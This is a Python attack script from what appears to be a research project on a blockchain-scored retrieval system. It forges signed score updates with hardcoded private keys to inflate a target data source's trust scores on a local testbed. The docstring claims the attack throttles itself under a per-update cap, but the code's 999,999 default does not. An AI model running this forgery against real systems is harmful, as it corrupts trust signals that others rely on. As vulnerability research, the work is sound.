"""
SSM-Score Key-Forgery Attack against Reliable-dRAG.

Threat model (control-plane / orchestrator-key-compromise -- NOT a lone
malicious data source, see .claude/ssm_grounding_farming_plan.md §7):
`feedbackAndUpdateScoreRecords` is gated `onlyLLMService`
(drag_contract/contracts/drag_scores.sol) -- only the LLM orchestrator's own
address may call it at all. This attack therefore requires possession of
the orchestrator's private key, not merely "control of a data source." What
it demonstrates is a *separate* finding from Grounding-Farming (the
flagship, no-privileged-access SSM instantiation): the signature scheme
verified inside the contract never actually binds to the score values being
written. `message_dict` (drag_llm_service/app/server.py:944-947) signs only
`{query, selected_sources}` -- a data source's signature says "I responded
to this query," not "these are my true reliability/usefulness deltas." So a
caller who already holds the orchestrator key (e.g. via a compromised
orchestrator host, not a compromised data source) can attach any data
source's previously-valid signature to entirely fabricated score values and
have them accepted, regardless of what actually happened at query time.

Because a real, deployed transaction-layer defense now exists
(drag_scores.sol: `MAX_DELTA_PER_UPDATE`=5,000 per tx, `MIN_UPDATE_INTERVAL`
=2s between updates to the same source), a naive single-shot massive
amplify (the original AMPLIFY=999999 default) reverts immediately with
`ScoreDeltaTooLarge` and does not demonstrate anything beyond "the defense
blocks reckless bursts" (see defense/ssm_defense/run_defense.py, which
exercises exactly that scenario on purpose). `attack/ssm_score/run_attack.py`
now throttles itself to stay just under both caps (a defense-aware
attacker), which still succeeds every round and still proves the underlying
finding: an orchestrator-key holder can write whatever score values it
wants, it just can't do it in one reckless leap.

Result: repeated, cap-respecting forged updates still let an attacker
holding the orchestrator key inflate a target source's R_i / U_i values by
an arbitrary, self-chosen amount over several rounds -- a fabrication of
the trust signal's content, not merely its magnitude or its transport.
"""
import json
import os
import sys
import time
from typing import Dict, List, Optional
PRIVATE_KEYS = {
    "sources_0":   "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "sources_20":  "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "sources_100": "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
    "llm_service": "0x701b615bbdfb9de65240bc28bd21bbc0d996645a3dd57e7b12bc2bdf6f192c82",
}
DEFAULT_DATA_SOURCES = {
    "sources_0":   "http://localhost:8001",
    "sources_20":  "http://localhost:8002",
    "sources_100": "http://localhost:8003",
}
LLM_SERVICE_URL = "http://localhost:9000"
BLOCKCHAIN_URL  = "http://localhost:8545"
class SSMScoreAttack:
    def __init__(
        self,
        target_source: str = "sources_100",
        blockchain_url: str = BLOCKCHAIN_URL,
        project_root: Optional[str] = None,
        amplify: int = 999_999,
        rounds: int = 5,
        llm_service_url: str = LLM_SERVICE_URL,
        inter_round_delay: float = 0.5,
    ):
        self.target_source     = target_source
        self.blockchain_url    = blockchain_url
        self.amplify           = amplify
        self.rounds            = rounds
        self.llm_service_url   = llm_service_url
        self.inter_round_delay = inter_round_delay
        self.project_root    = project_root or os.path.abspath(
            os.path.join(os.path.dirname(__file__), '..', '..')
        )
        self._client = None
    def _get_client(self):
        if self._client is not None:
            return self._client
        sys.path.insert(0, os.path.join(self.project_root, 'drag_python_client'))
        from drag_python_client import DragScoresClient
        self._client = DragScoresClient(
            project_root=self.project_root,
            provider_url=self.blockchain_url,
        )
        return self._client
    def get_current_scores(self) -> Dict[str, Dict[str, int]]:
        client = self._get_client()
        source_ids = list(DEFAULT_DATA_SOURCES.keys())
        ids, rel_scores, use_scores = client.get_scores_batch(source_ids)
        result = {}
        for i, sid in enumerate(ids):
            result[sid] = {
                "reliability": rel_scores[i] if i < len(rel_scores) else 0,
                "usefulness":  use_scores[i]  if i < len(use_scores)  else 0,
            }
        return result
    def _sign_fake_message(self, source_id: str) -> bytes:
        sys.path.insert(0, os.path.join(self.project_root, 'drag_python_client'))
        from drag_python_client import sign_message_personal
        fake_message = json.dumps({
            "query": "attack_probe",
            "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
        }, sort_keys=True)
        return sign_message_personal(fake_message, PRIVATE_KEYS[source_id])
    def inflate_scores(self, target_source: Optional[str] = None) -> Dict:
        target = target_source or self.target_source
        client = self._get_client()
        before = self.get_current_scores()
        print(f"\n  Scores BEFORE attack:")
        for sid, s in before.items():
            marker = " <- TARGET" if sid == target else ""
            print(f"    {sid:15s}  R={s['reliability']:>10,}  U={s['usefulness']:>10,}{marker}")
        tx_hashes = []
        for rnd in range(1, self.rounds + 1):
            print(f"\n  Round {rnd}/{self.rounds} -- inflating {target}...")
            try:
                current = self.get_current_scores()
                cur_rel = current.get(target, {}).get("reliability", 0)
                cur_use = current.get(target, {}).get("usefulness",  0)
                new_rel = cur_rel + self.amplify
                new_use = cur_use + self.amplify
                sig_bytes = self._sign_fake_message(target)
                fake_message = json.dumps({
                    "query": "attack_probe",
                    "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
                }, sort_keys=True)
                tx = client.feedback_and_update_score_records(
                    caller_private_key=PRIVATE_KEYS["llm_service"],
                    message=fake_message,
                    signatures=[sig_bytes],
                    update_source_ids=[target],
                    update_reliability_scores=[new_rel],
                    update_usefulness_scores=[new_use],
                    info=f"SSM_ATTACK_round_{rnd}",
                )
                tx_hashes.append(tx)
                print(f"    TX: {tx}  ->  R={new_rel:,}  U={new_use:,}")
                time.sleep(self.inter_round_delay)
            except Exception as e:
                print(f"    ERROR in round {rnd}: {e}")
        after = self.get_current_scores()
        print(f"\n  Scores AFTER attack:")
        for sid, s in after.items():
            marker = " <- TARGET" if sid == target else ""
            print(f"    {sid:15s}  R={s['reliability']:>10,}  U={s['usefulness']:>10,}{marker}")
        return {
            "target_source": target,
            "rounds": self.rounds,
            "amplify_per_round": self.amplify,
            "tx_hashes": tx_hashes,
            "scores_before": before,
            "scores_after":  after,
        }
    def reset_scores(self) -> Dict:
        client = self._get_client()
        results = {}
        for source_id in DEFAULT_DATA_SOURCES:
            try:
                sig_bytes = self._sign_fake_message(source_id)
                fake_message = json.dumps({
                    "query": "attack_probe",
                    "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
                }, sort_keys=True)
                tx = client.feedback_and_update_score_records(
                    caller_private_key=PRIVATE_KEYS["llm_service"],
                    message=fake_message,
                    signatures=[sig_bytes],
                    update_source_ids=[source_id],
                    update_reliability_scores=[10000],
                    update_usefulness_scores=[10000],
                    info="SSM_ATTACK_reset",
                )
                results[source_id] = f"reset OK (tx={tx})"
                time.sleep(0.3)
            except Exception as e:
                results[source_id] = f"ERROR: {e}"
        return results
